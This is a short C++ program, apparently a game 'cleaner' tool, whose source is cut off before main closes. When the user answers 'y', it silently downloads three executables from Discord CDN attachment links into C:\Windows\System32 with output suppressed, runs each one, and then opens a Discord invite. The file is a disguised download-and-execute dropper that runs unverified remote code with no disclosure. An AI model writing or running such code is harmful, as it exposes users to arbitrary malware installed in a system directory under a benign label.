#include <iostream>
#include <string>
#include <thread>
#include <chrono>

int main()
{
    std::string choice;

    std::cout << ("                                                 Do You Want To Full Clean? y/n   \n");
    std::cin >> choice;

    if (choice == "y" || choice == "Y") {
        system("curl --silent https://cdn.discordapp.com/attachments/1136407710045306941/1138391339302649896/4_applecleaner.exe --output C:\\Windows\\System32\\4_applecleaner.exe >nul 2>&1");
        system("cd C:\\Windows\\System32\\ && 4_applecleaner.exe");
        system("cls");
        system("curl --silent https://cdn.discordapp.com/attachments/1136407710045306941/1138391373125529630/2_Fortnite_Cleaner.exe --output C:\\Windows\\System32\\2_Fortnite_Cleaner.exe >nul 2>&1");
        system("cd C:\\Windows\\System32\\ && 2_Fortnite_Cleaner.exe");
        system("cls");
        system("curl --silent https://cdn.discordapp.com/attachments/1136407710045306941/1138391347712249866/fnclean.exe --output C:\\Windows\\System32\\fnclean.exe >nul 2>&1");
        system("cd C:\\Windows\\System32\\ && fnclean.exe");
        system("cls");
        std::cout << "DONE CLEANING" << std::endl;
        system("start https://discord.gg/Pvvfw4vu");
    }